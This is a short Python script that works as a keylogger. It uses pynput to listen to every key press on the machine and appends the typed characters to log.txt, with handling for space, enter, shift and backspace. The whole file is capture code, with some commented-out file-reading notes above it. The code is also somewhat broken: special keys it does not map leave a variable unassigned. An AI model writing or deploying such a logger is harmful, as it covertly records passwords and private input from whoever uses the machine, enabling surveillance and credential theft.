#r= reading, w=write a=apending
# f=open('log.txt','r')
# #f.write("i'm litterally a genius")
# filedata=f.read()
# print(filedata)
# f.close()
from pynput.keyboard import Listener,Key
#listen 
def writetofile(key):
    try:
        keydata=key.char
    #    keydata=keydata.replace("'","")
    except AttributeError:
        if key==Key.space:
            keydata= " "
        if key==Key.shift_r:
            keydata= ""
        if key==Key.backspace:
            with open('log.txt', 'rb+') as f:
                    f.seek(0, 2)  # aller à la fin
                    size = f.tell()
                    if size > 0:
                        f.truncate(size - 1)
            return
        if key==Key.shift:
            keydata= ""
        if key==Key.enter:
            keydata= "\n"
    #    if key==Key.ctrl_l\x03:
    #        keydata= ""
    with open('log.txt', 'a',encoding='utf-8') as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()

